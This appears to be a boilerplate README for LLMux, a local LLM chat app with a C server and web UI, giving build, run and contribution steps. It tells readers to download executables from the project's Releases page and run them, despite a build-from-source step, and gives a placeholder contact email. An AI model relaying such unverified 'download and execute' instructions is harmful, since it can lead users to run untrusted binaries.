# LLMux: Lightweight Local LLM Chat

![LLMux](https://img.shields.io/badge/LLMux-v1.0-blue.svg) ![GitHub Releases](https://img.shields.io/badge/Releases-latest-orange.svg)

Welcome to LLMux, a lightweight local LLM chat application. This project features a web UI and a C-based server that runs any LLM chat executable as a child process. It communicates through pipes, providing an efficient and straightforward way to engage with local AI models.

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Releases](#releases)

## Introduction

LLMux aims to simplify the interaction with local language models. By leveraging a C-based server and a user-friendly web interface, users can chat with AI models without the need for internet connectivity. This self-hosted solution is ideal for developers and enthusiasts who want to experiment with AI in a controlled environment.

## Features

- **Lightweight**: Minimal resource usage for optimal performance.
- **Local Execution**: Runs models locally without relying on cloud services.
- **Web UI**: A simple and intuitive web interface for easy interaction.
- **C-based Server**: Efficient communication through a C-based server that runs child processes.
- **Compatibility**: Supports various LLM chat executables, making it versatile for different use cases.
- **Single Session**: Designed for one-on-one interactions to maintain focus.
- **Offline Capability**: No internet required, ensuring privacy and security.
- **Tailwind CSS**: Utilizes Tailwind CSS for a modern and responsive design.

## Installation

To get started with LLMux, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/yashboss1111/LLMux.git
   cd LLMux
   ```

2. **Build the Project**:
   Ensure you have a C compiler installed. You can use `gcc` or `clang`. Run the following command to compile:
   ```bash
   make
   ```

3. **Download Executables**:
   You need to download the necessary LLM chat executables. Visit the [Releases](https://github.com/yashboss1111/LLMux/releases) section to find the latest files. Download and execute them according to the instructions provided.

4. **Run the Server**:
   After building and downloading the necessary files, you can start the server:
   ```bash
   ./llmux_server
   ```

5. **Access the Web UI**:
   Open your web browser and go to `http://localhost:8080` to start chatting with your local LLM.

## Usage

Once the server is running, you can use the web interface to interact with the AI model. Here’s how to get the most out of LLMux:

- **Start a Session**: Click on the "Start Chat" button to begin your conversation.
- **Input Text**: Type your message in the input box and press "Enter" to send it.
- **Receive Responses**: The AI will respond in real-time, allowing for a fluid conversation.

### Example Chat

**User**: What is the capital of France?  
**AI**: The capital of France is Paris.

Feel free to experiment with different queries and topics. The AI is designed to handle a wide range of conversations.

## Contributing

We welcome contributions from the community. If you would like to help improve LLMux, please follow these steps:

1. **Fork the Repository**: Click on the "Fork" button on the top right of the page.
2. **Create a Branch**: Use the following command to create a new branch:
   ```bash
   git checkout -b feature/YourFeatureName
   ```
3. **Make Changes**: Implement your feature or fix a bug.
4. **Commit Your Changes**: Use a clear commit message:
   ```bash
   git commit -m "Add your message here"
   ```
5. **Push to the Branch**:
   ```bash
   git push origin feature/YourFeatureName
   ```
6. **Open a Pull Request**: Go to the original repository and click on "New Pull Request".

## License

LLMux is licensed under the MIT License. You can freely use, modify, and distribute the software. Please see the `LICENSE` file for more details.

## Contact

For questions or suggestions, feel free to reach out:

- **GitHub**: [yashboss1111](https://github.com/yashboss1111)
- **Email**: your-email@example.com

## Releases

To download the latest version of LLMux, visit the [Releases](https://github.com/yashboss1111/LLMux/releases) section. Make sure to download the appropriate files and follow the installation instructions provided there.

## Conclusion

Thank you for your interest in LLMux. We hope you find this tool useful for your local AI projects. Feel free to explore the code, contribute, and share your experiences. Happy chatting!